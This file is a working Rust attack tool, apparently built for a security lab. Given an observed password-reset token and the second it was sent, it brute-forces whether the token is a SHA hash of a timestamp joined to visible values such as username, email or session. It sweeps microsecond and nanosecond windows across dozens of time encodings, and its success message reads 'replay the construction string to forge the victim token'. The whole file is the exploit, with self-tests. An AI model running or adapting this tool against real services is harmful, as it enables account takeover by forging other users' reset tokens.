#!/usr/bin/env rust-script
//! name: ts_seed_sweep
//! description: 时间种子构造扫描件(时间敏感型令牌正控) - 给定一个已观测的 40hex 令牌与其 UTC 秒级发出时刻,在 [sec, sec+1) 微秒窗内按多形态时间编码 × 可见值原子(用户名/邮箱/session/csrf)x 前置后置 × 分隔符 求哈希逐格比对,命中即给出该令牌的精确微秒与完整构造串;--mode static 只跑可见值原子组合;--selftest 自带合成正控(证明管线能从令牌复现构造)与负控(随机目标零命中)。
//! version: 1.0.0
//! args: <target-hex> --sec S [--pad-us N | --us-lo N --us-hi N] [--atoms 'a|b'] [--hashes sha1,sha256] [--forms all|LIST] [--seps 'SEP1|SEP2'] [--mode time|static] [--max-report N] [--selftest]
//! keywords: 时间敏感, 令牌构造, 密码重置, sha1, 正控, 微秒窗, 种子, time-sensitive, token-forge
//!
//! ```cargo
//! [dependencies]
//! sha1 = "0.10"
//! sha2 = "0.10"
//! rayon = "1.10"
//!
//! [profile.dev]
//! opt-level = 3
//! ```

use pi_rust_lib::report;
use pi_rust_lib::serde_json::{json, Value};
use rayon::prelude::*;
use sha1::{Digest, Sha1};
use sha2::{Sha256, Sha512};

const ALL_FORMS: &[&str] = &[
    "sec", "ms", "us", "ns", "sec_hex", "ms_hex", "us_hex", "float", "float3", "float6",
    "frac6", "frac3", "digits_sec_frac", "date", "iso", "be_u32_sec", "le_u64_us", "be_u64_us",
    "be_u64_ms", "php_microtime", "uniqid", "iso_ms", "iso_space_ms", "rfc1123", "clock", "clock_ms",
    "ms_of_day", "sec_of_day", "compact_date", "compact_dt",
];

fn hex(bytes: &[u8]) -> String {
    let mut s = String::with_capacity(bytes.len() * 2);
    for b in bytes {
        s.push_str(&format!("{b:02x}"));
    }
    s
}

fn hash_hex(kind: &str, b: &[u8]) -> String {
    if kind == "sha256" {
        let mut h = Sha256::new();
        h.update(b);
        hex(&h.finalize())
    } else if kind == "sha512" {
        let mut h = Sha512::new();
        h.update(b);
        hex(&h.finalize())
    } else {
        let mut h = Sha1::new();
        h.update(b);
        hex(&h.finalize())
    }
}

/// Digest hex truncated to the target length - a 40-hex target is also matched
/// by sha256/sha512 digests that were sliced before being stored.
fn digest_matches(kind: &str, b: &[u8], target: &str) -> bool {
    let d = hash_hex(kind, b);
    d.len() >= target.len() && &d[..target.len()] == target
}

/// Howard Hinnant civil-from-days; UTC only, so no zone table is needed.
fn civil_from_days(z: i64) -> (i64, u32, u32) {
    let z = z + 719_468;
    let era = if z >= 0 { z } else { z - 146_096 } / 146_097;
    let doe = (z - era * 146_097) as u64;
    let yoe = (doe - doe / 1460 + doe / 36_524 - doe / 146_096) / 365;
    let y = yoe as i64 + era * 400;
    let doy = doe - (365 * yoe + yoe / 4 - yoe / 100);
    let mp = (5 * doy + 2) / 153;
    let d = (doy - (153 * mp + 2) / 5 + 1) as u32;
    let m = if mp < 10 { mp + 3 } else { mp - 9 } as u32;
    (if m <= 2 { y + 1 } else { y }, m, d)
}

fn fmt_utc(sec: u64, iso: bool) -> String {
    let days = (sec / 86_400) as i64;
    let rem = sec % 86_400;
    let (y, mo, d) = civil_from_days(days);
    let (hh, mi, ss) = (rem / 3600, (rem % 3600) / 60, rem % 60);
    if iso {
        format!("{y:04}-{mo:02}-{d:02}T{hh:02}:{mi:02}:{ss:02}")
    } else {
        format!("{y:04}-{mo:02}-{d:02} {hh:02}:{mi:02}:{ss:02}")
    }
}

/// Every time-encoding string this microsecond value can plausibly take.
fn encodings(us: u64, forms: &[String]) -> Vec<(String, String)> {
    let sec = us / 1_000_000;
    let ms = us / 1000;
    let frac = us % 1_000_000;
    let f = sec as f64 + frac as f64 / 1_000_000.0;
    let mut out: Vec<(String, String)> = Vec::with_capacity(forms.len());
    for name in forms {
        let v = match name.as_str() {
            "sec" => sec.to_string(),
            "ms" => ms.to_string(),
            "us" => us.to_string(),
            "ns" => (us * 1000).to_string(),
            "sec_hex" => format!("{sec:x}"),
            "ms_hex" => format!("{ms:x}"),
            "us_hex" => format!("{us:x}"),
            "float" => format!("{f}"),
            "float3" => format!("{f:.3}"),
            "float6" => format!("{f:.6}"),
            "frac6" => format!("{sec}.{frac:06}"),
            "frac3" => format!("{sec}.{:03}", frac / 1000),
            "digits_sec_frac" => format!("{sec}{frac:06}"),
            "date" => fmt_utc(sec, false),
            "iso" => fmt_utc(sec, true),
            "be_u32_sec" => hex(&(sec as u32).to_be_bytes()),
            "le_u64_us" => hex(&us.to_le_bytes()),
            "be_u64_us" => hex(&us.to_be_bytes()),
            "be_u64_ms" => hex(&ms.to_be_bytes()),
            "php_microtime" => format!("{:.8} {}", frac as f64 / 1_000_000.0, sec),
            "uniqid" => format!("{sec:08x}{frac:05x}"),
            "clock" => {
                let rem = sec % 86_400;
                format!("{:02}:{:02}:{:02}", rem / 3600, (rem % 3600) / 60, rem % 60)
            }
            "clock_ms" => {
                let rem = sec % 86_400;
                format!("{:02}:{:02}:{:02}.{:03}", rem / 3600, (rem % 3600) / 60, rem % 60, frac / 1000)
            }
            "ms_of_day" => ((sec % 86_400) * 1000 + frac / 1000).to_string(),
            "sec_of_day" => (sec % 86_400).to_string(),
            "compact_date" => {
                let (y, mo, d) = civil_from_days((sec / 86_400) as i64);
                format!("{y:04}{mo:02}{d:02}")
            }
            "compact_dt" => {
                let (y, mo, d) = civil_from_days((sec / 86_400) as i64);
                let rem = sec % 86_400;
                format!("{y:04}{mo:02}{d:02}{:02}{:02}{:02}", rem / 3600, (rem % 3600) / 60, rem % 60)
            }
            "iso_ms" => {
                let (y, mo, d) = civil_from_days((sec / 86_400) as i64);
                let rem = sec % 86_400;
                format!("{y:04}-{mo:02}-{d:02}T{:02}:{:02}:{:02}.{:03}Z", rem / 3600, (rem % 3600) / 60, rem % 60, frac / 1000)
            }
            "iso_space_ms" => {
                let (y, mo, d) = civil_from_days((sec / 86_400) as i64);
                let rem = sec % 86_400;
                format!("{y:04}-{mo:02}-{d:02} {:02}:{:02}:{:02}.{:03}", rem / 3600, (rem % 3600) / 60, rem % 60, frac / 1000)
            }
            "rfc1123" => {
                const WD: [&str; 7] = ["Sun", "Mon", "Tue", "Wed", "Thu", "Fri", "Sat"];
                const MO: [&str; 12] = ["Jan", "Feb", "Mar", "Apr", "May", "Jun", "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"];
                let days = (sec / 86_400) as i64;
                let wd = ((days + 4).rem_euclid(7)) as usize;
                let (y, mo, d) = civil_from_days(days);
                let rem = sec % 86_400;
                format!("{}, {:02} {} {} {:02}:{:02}:{:02} GMT", WD[wd], d, MO[(mo - 1) as usize], y, rem / 3600, (rem % 3600) / 60, rem % 60)
            }
            _ => continue,
        };
        out.push((name.clone(), v));
    }
    out
}

/// Atom syntax: `sha1:<s>` / `upper:<s>` expand to the derived string plus the
/// literal, so a derived seed (e.g. sha1 of the username) can be tested in place.
fn expand_atoms(atoms: &[String]) -> Vec<String> {
    let mut out: Vec<String> = Vec::with_capacity(atoms.len() * 2);
    for a in atoms {
        if let Some(rest) = a.strip_prefix("sha1:") {
            out.push(hex(&Sha1::digest(rest.as_bytes())));
        } else if let Some(rest) = a.strip_prefix("upper:") {
            out.push(rest.to_uppercase());
        }
        out.push(a.clone());
    }
    out
}

struct Cfg {
    target: String,
    hashes: Vec<String>,
    forms: Vec<String>,
    seps: Vec<String>,
}

/// Sweep [lo,hi) microseconds; every (us, encoding, atom, order, sep, hash)
/// combination is one candidate. Returns (hits, candidates_tested).
fn sweep_time(cfg: &Cfg, lo: u64, hi: u64, atoms: &[String], step_us: u64) -> (Vec<Value>, u64) {
    let n = hi.saturating_sub(lo);
    let step = step_us.max(1) as usize;
    let offsets: Vec<u64> = (0..n).step_by(step).collect();
    let rows: Vec<(Vec<Value>, u64)> = offsets
        .into_par_iter()
        .map(|i| {
            let us = lo + i;
            let encs = encodings(us, &cfg.forms);
            let mut local: Vec<Value> = Vec::new();
            let mut count: u64 = 0;
            for (fname, e) in &encs {
                for a in atoms {
                    for sep in &cfg.seps {
                        let post = format!("{e}{sep}{a}");
                        let pre = format!("{a}{sep}{e}");
                        for (ord, s) in [("post", post), ("pre", pre)] {
                            for hk in &cfg.hashes {
                                count += 1;
                                if digest_matches(hk, s.as_bytes(), &cfg.target) {
                                    local.push(json!({
                                        "us": us, "form": fname, "atom": a, "order": ord,
                                        "sep": sep, "hash": hk, "input": s,
                                    }));
                                }
                            }
                        }
                    }
                }
            }
            (local, count)
        })
        .collect();
    let tested: u64 = rows.iter().map(|(_, c)| c).sum();
    (rows.into_iter().flat_map(|(h, _)| h).collect(), tested)
}

/// Static (time-free) battery: ordered selections of 1..=3 atoms joined by each sep.
fn sweep_static(cfg: &Cfg, atoms: &[String]) -> (Vec<Value>, u64) {
    let mut cands: Vec<String> = atoms.to_vec();
    for a in atoms {
        for b in atoms {
            if a == b {
                continue;
            }
            for sep in &cfg.seps {
                cands.push(format!("{a}{sep}{b}"));
            }
        }
    }
    if atoms.len() <= 8 {
        for a in atoms {
            for b in atoms {
                for c in atoms {
                    for sep in &cfg.seps {
                        cands.push(format!("{a}{sep}{b}{sep}{c}"));
                    }
                }
            }
        }
    }
    let mut hits = Vec::new();
    let mut count = 0u64;
    for s in &cands {
        for hk in &cfg.hashes {
            count += 1;
            if digest_matches(hk, s.as_bytes(), &cfg.target) {
                hits.push(json!({ "atom": s, "hash": hk, "input": s }));
            }
        }
    }
    (hits, count)
}

/// Encodings of a *nanosecond* instant on the float lattice - the family a
/// Python `sha1(user + str(time.time()))` mint produces. The double is built as
/// `sec + frac/1e9`, which is the same value the clock hands out, so `format!`
/// (shortest round-trip, exactly like Python repr) reproduces the seed string.
fn encodings_ns(ns: u64, forms: &[String]) -> Vec<(String, String)> {
    let sec = ns / 1_000_000_000;
    let frac = ns % 1_000_000_000;
    let f = sec as f64 + (frac as f64) / 1_000_000_000.0;
    let mut out: Vec<(String, String)> = Vec::with_capacity(forms.len());
    for name in forms {
        let v = match name.as_str() {
            "pyfloat" => format!("{f}"),
            "pyfloat8" => format!("{f:.8}"),
            "pyfloat3" => format!("{f:.3}"),
            "frac9" => format!("{sec}.{frac:09}"),
            "nsint" => ns.to_string(),
            "nshex" => format!("{ns:x}"),
            _ => continue,
        };
        out.push((name.clone(), v));
    }
    out
}

/// Sweep the float lattice across [ns_lo, ns_hi) at `step` nanoseconds.
fn sweep_floatns(cfg: &Cfg, ns_lo: u64, ns_hi: u64, step: u64, atoms: &[String]) -> (Vec<Value>, u64) {
    let count = ns_hi.saturating_sub(ns_lo) / step.max(1) + 1;
    let rows: Vec<(Vec<Value>, u64)> = (0..count)
        .into_par_iter()
        .map(|i| {
            let ns = ns_lo + i * step;
            let encs = encodings_ns(ns, &cfg.forms);
            let mut local: Vec<Value> = Vec::new();
            let mut count_local: u64 = 0;
            for (fname, e) in &encs {
                for a in atoms {
                    for sep in &cfg.seps {
                        let post = format!("{e}{sep}{a}");
                        let pre = format!("{a}{sep}{e}");
                        for (ord, s) in [("post", post), ("pre", pre)] {
                            for hk in &cfg.hashes {
                                count_local += 1;
                                if digest_matches(hk, s.as_bytes(), &cfg.target) {
                                    local.push(json!({
                                        "ns": ns, "form": fname, "atom": a, "order": ord,
                                        "sep": sep, "hash": hk, "input": s,
                                    }));
                                }
                            }
                        }
                    }
                }
            }
            (local, count_local)
        })
        .collect();
    let tested: u64 = rows.iter().map(|(_, c)| c).sum();
    (rows.into_iter().flat_map(|(h, _)| h).collect(), tested)
}

fn selftest() {
    let seps = vec!["".to_string(), ":".to_string()];
    let atoms = vec!["wiener".to_string()];
    let mut checks = Vec::new();
    let mut ok = true;

    // Positive control 1: us-encoding construction, post order, empty separator.
    let us0: u64 = 1_791_797_799_123_456;
    let input = format!("{us0}wiener");
    let target = hash_hex("sha1", input.as_bytes());
    let cfg = Cfg {
        target: target.clone(),
        hashes: vec!["sha1".to_string()],
        forms: vec!["us".to_string()],
        seps: seps.clone(),
    };
    let (hits, _) = sweep_time(&cfg, us0 - 2000, us0 + 2000, &atoms, 1);
    let got = hits.iter().any(|h| h["input"] == json!(input.clone()));
    ok &= got;
    checks.push(json!({ "leg": "us_encoding", "target": target, "found": got, "hits": hits.len() }));

    // Positive control 2: float encoding with a ":" separator and pre order.
    let us1: u64 = 1_791_797_799_654_321;
    let f = (us1 / 1_000_000) as f64 + (us1 % 1_000_000) as f64 / 1_000_000.0;
    let input1 = format!("wiener:{}", f);
    let target1 = hash_hex("sha1", input1.as_bytes());
    let cfg1 = Cfg {
        target: target1.clone(),
        hashes: vec!["sha1".to_string()],
        forms: vec!["float".to_string()],
        seps: seps.clone(),
    };
    let (hits1, _) = sweep_time(&cfg1, us1 - 2000, us1 + 2000, &atoms, 1);
    let got1 = hits1.iter().any(|h| h["input"] == json!(input1.clone()));
    ok &= got1;
    checks.push(json!({ "leg": "float_encoding", "target": target1, "found": got1, "hits": hits1.len() }));

    // Negative control: a target nobody in the window can produce.
    let cfg_neg = Cfg {
        target: "0".repeat(40),
        hashes: vec!["sha1".to_string()],
        forms: vec!["us".to_string(), "sec".to_string()],
        seps: seps.clone(),
    };
    let (hits_neg, tested_neg) = sweep_time(&cfg_neg, us0 - 500, us0 + 500, &atoms, 1);
    ok &= hits_neg.is_empty() && tested_neg > 0;
    checks.push(json!({ "leg": "negative_control", "found": hits_neg.is_empty(), "tested": tested_neg }));

    // Static battery must recover a plain two-atom join.
    let target2 = hash_hex("sha1", b"wiener:peter");
    let cfg2 = Cfg {
        target: target2.clone(),
        hashes: vec!["sha1".to_string()],
        forms: vec![],
        seps: vec![":".to_string()],
    };
    let (hits2, _) = sweep_static(&cfg2, &["wiener".to_string(), "peter".to_string()]);
    let got2 = hits2.iter().any(|h| h["input"] == json!("wiener:peter"));
    ok &= got2;
    checks.push(json!({ "leg": "static_battery", "found": got2 }));

    // Positive control 3: the float-lattice family (Python str(time.time())).
    let ns0: u64 = 1_791_799_249_123_456_789;
    let f0 = (ns0 / 1_000_000_000) as f64 + ((ns0 % 1_000_000_000) as f64) / 1_000_000_000.0;
    let input3 = format!("wiener{f0}");
    let target3 = hash_hex("sha1", input3.as_bytes());
    let cfg3 = Cfg {
        target: target3.clone(),
        hashes: vec!["sha1".to_string()],
        forms: vec!["pyfloat".to_string()],
        seps: vec!["".to_string()],
    };
    let (hits3, _) = sweep_floatns(&cfg3, ns0 - 400_000, ns0 + 400_000, 256, &atoms);
    let got3 = hits3.iter().any(|h| h["input"] == json!(input3.clone()));
    ok &= got3;
    checks.push(json!({ "leg": "float_lattice", "target": target3, "found": got3, "hits": hits3.len() }));

    let payload = json!({ "ok": ok, "checks": checks });
    if ok {
        report::success(
            "ts_seed_sweep",
            payload,
            "pipeline is provably able to recover a construction; run it on a real (token, Sent-second) pair",
        )
        .expect("report");
    } else {
        report::failure("ts_seed_sweep", &payload.to_string(), "fix the sweep before trusting a zero result");
    }
}

fn main() {
    let args: Vec<String> = std::env::args().skip(1).collect();
    if args.iter().any(|a| a == "--selftest") {
        selftest();
        return;
    }

    let mut target: Option<String> = None;
    let mut sec: Option<u64> = None;
    let mut us_lo: Option<u64> = None;
    let mut us_hi: Option<u64> = None;
    let mut pad_us: u64 = 0;
    let mut atoms: Vec<String> = Vec::new();
    let mut hashes: Vec<String> = vec!["sha1".to_string()];
    let mut forms: Vec<String> = ALL_FORMS.iter().map(|s| s.to_string()).collect();
    let mut seps: Vec<String> = vec![
        "".to_string(),
        ":".to_string(),
        "|".to_string(),
        "_".to_string(),
        "-".to_string(),
        ".".to_string(),
        "&".to_string(),
    ];
    let mut mode = "time".to_string();
    let mut step_us: u64 = 1;
    let mut step_ns: u64 = 256;
    let mut max_report: usize = 50;

    let mut i = 0;
    while i < args.len() {
        let a = args[i].clone();
        match a.as_str() {
            "--sec" => {
                i += 1;
                sec = args.get(i).and_then(|s| s.parse().ok());
                if sec.is_none() {
                    report::failure("ts_seed_sweep", "--sec needs epoch seconds", "e.g. --sec 1791797799");
                    return;
                }
            }
            "--us-lo" => {
                i += 1;
                us_lo = args.get(i).and_then(|s| s.parse().ok());
            }
            "--us-hi" => {
                i += 1;
                us_hi = args.get(i).and_then(|s| s.parse().ok());
            }
            "--pad-us" => {
                i += 1;
                pad_us = args.get(i).and_then(|s| s.parse().ok()).unwrap_or(0);
            }
            "--atoms" => {
                i += 1;
                if let Some(s) = args.get(i) {
                    atoms.extend(s.split('|').map(|x| x.to_string()));
                }
            }
            "--hashes" => {
                i += 1;
                if let Some(s) = args.get(i) {
                    hashes = s.split(',').map(|x| x.trim().to_string()).filter(|x| !x.is_empty()).collect();
                }
            }
            "--forms" => {
                i += 1;
                if let Some(s) = args.get(i) {
                    if s != "all" {
                        forms = s.split(',').map(|x| x.trim().to_string()).filter(|x| !x.is_empty()).collect();
                    }
                }
            }
            "--seps" => {
                i += 1;
                if let Some(s) = args.get(i) {
                    seps = s.split('|').map(|x| x.to_string()).collect();
                }
            }
            "--mode" => {
                i += 1;
                mode = args.get(i).cloned().unwrap_or_else(|| "time".to_string());
            }
            "--max-report" => {
                i += 1;
                max_report = args.get(i).and_then(|s| s.parse().ok()).unwrap_or(50);
            }
            "--step-us" => {
                i += 1;
                step_us = args.get(i).and_then(|s| s.parse().ok()).unwrap_or(1).max(1);
            }
            "--step-ns" => {
                i += 1;
                step_ns = args.get(i).and_then(|s| s.parse().ok()).unwrap_or(256).max(1);
            }
            other if target.is_none() && !other.starts_with('-') => target = Some(other.to_lowercase()),
            other => {
                report::failure(
                    "ts_seed_sweep",
                    &format!("unknown arg: {other}"),
                    "usage: ts_seed_sweep <target-hex> --sec S [--atoms 'a|b'] [--mode time|static] [--selftest]",
                );
                return;
            }
        }
        i += 1;
    }

    let Some(target) = target else {
        report::failure("ts_seed_sweep", "missing target token", "usage: ts_seed_sweep <target-hex> --sec S [--atoms 'a|b']");
        return;
    };
    for h in &hashes {
        if h != "sha1" && h != "sha256" && h != "sha512" {
            report::failure("ts_seed_sweep", &format!("unknown hash: {h}"), "use --hashes sha1,sha256,sha512");
            return;
        }
    }
    if atoms.is_empty() {
        atoms.push(String::new());
    }
    let atoms = expand_atoms(&atoms);

    let cfg = Cfg {
        target: target.clone(),
        hashes: hashes.clone(),
        forms: forms.clone(),
        seps: seps.clone(),
    };

    let start = std::time::Instant::now();
    let (hits, tested, lo, hi) = if mode == "static" {
        let (h, t) = sweep_static(&cfg, &atoms);
        (h, t, 0u64, 0u64)
    } else if mode == "floatns" {
        if sec.is_none() && (us_lo.is_none() || us_hi.is_none()) {
            report::failure("ts_seed_sweep", "floatns needs --sec (or both --us-lo/--us-hi)", "pass the observed epoch second");
            return;
        }
        let s = sec.unwrap_or(0);
        let l = us_lo.unwrap_or(s * 1_000_000).saturating_sub(pad_us) * 1000;
        let h = (us_hi.unwrap_or((s + 1) * 1_000_000) + pad_us) * 1000;
        let (hh, tt) = sweep_floatns(&cfg, l, h, step_ns, &atoms);
        (hh, tt, l, h)
    } else {
        if sec.is_none() && (us_lo.is_none() || us_hi.is_none()) {
            report::failure("ts_seed_sweep", "missing --sec (or both --us-lo/--us-hi)", "pass the observed epoch second");
            return;
        }
        let s = sec.unwrap_or(0);
        let l = us_lo.unwrap_or(s * 1_000_000).saturating_sub(pad_us);
        let h = us_hi.unwrap_or((s + 1) * 1_000_000) + pad_us;
        let (hh, tt) = sweep_time(&cfg, l, h, &atoms, step_us);
        (hh, tt, l, h)
    };

    let elapsed_ms = start.elapsed().as_millis() as u64;
    let reported: Vec<Value> = hits.iter().take(max_report).cloned().collect();
    let payload = json!({
        "target": target,
        "mode": mode,
        "sec": sec,
        "us_lo": lo,
        "us_hi": hi,
        "window_us": hi.saturating_sub(lo),
        "step_us": step_us,
        "atoms": atoms,
        "hashes": hashes,
        "forms": forms,
        "seps": seps,
        "candidates_tested": tested,
        "hits_total": hits.len(),
        "hits": reported,
        "elapsed_ms": elapsed_ms,
    });

    if hits.is_empty() {
        report::success(
            "ts_seed_sweep",
            payload,
            "no match: widen --forms/--seps/--atoms, add --pad-us, or the construction is not time+visible-value",
        )
        .expect("report");
    } else {
        report::success("ts_seed_sweep", payload, "match found: replay the construction string to forge the victim token")
            .expect("report");
    }
}
